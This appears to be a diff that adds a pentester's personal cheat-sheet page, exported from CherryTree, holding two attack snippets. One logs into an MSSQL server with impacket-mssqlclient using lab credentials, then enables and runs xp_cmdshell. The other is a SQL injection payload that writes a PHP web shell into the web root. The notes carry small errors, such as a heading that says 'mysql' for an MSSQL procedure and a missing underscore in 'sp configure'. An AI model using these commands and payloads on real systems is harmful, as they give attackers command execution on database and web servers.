@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>manual</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>manual</h1><br/><p># add command execution to mysql db</p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#connect to db</span><br />impacket-mssqlclient Administrator<span style="color:#ff9d00;font-weight:700">:</span>Lab123@192.168.50.18 -windows-auth<span style="color:#ff9d00;font-weight:700">;</span><br /><br /><span style="color:#0088ff;font-weight:400"># enable advanced options</span><br />SQL&gt; EXECUTE sp_configure <span style="color:#3ad900;font-weight:400">&#39;show advanced options&#39;</span>, 1<span style="color:#ff9d00;font-weight:700">;</span><br /><br /><span style="color:#0088ff;font-weight:400"># enable shell</span><br />SQL&gt; RECONFIGURE<span style="color:#ff9d00;font-weight:700">;</span><br />SQL&gt; EXECUTE sp configure <span style="color:#3ad900;font-weight:400">&#39;xp_cmdshell&#39;</span>, 1<span style="color:#ff9d00;font-weight:700">;</span><br />SQL&gt; RECONFIGURE<span style="color:#ff9d00;font-weight:700">;</span><br /><br /><span style="color:#0088ff;font-weight:400"># execute commands</span><br />SQL&gt; EXECUTE xp_cmdshell <span style="color:#3ad900;font-weight:400">&quot;whoami&quot;</span><br /></pre></div></p><p></p><p># example payload for sql file inclusion to revshell</p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">UNION</span> <span style="color:#ff9d00;font-weight:700">SELECT</span> &quot;&lt;?php system($_GET[<span style="color:#3ad900;font-weight:400">&#39;cmd &#39;</span>]);?&gt;&quot; <span style="color:#ff0044;font-weight:400">null</span>, <span style="color:#ff0044;font-weight:400">null</span>, <span style="color:#ff0044;font-weight:400">null</span>, <span style="color:#ff0044;font-weight:400">null</span> <span style="color:#ff9d00;font-weight:700">INTO</span> OUTFILE<br />&quot;/var/www/html/tmp/webshell.php&quot; <span style="color:#0088ff;font-weight:400">-- //</span></pre></div></p><p></p></div>
+</body>
+</html>
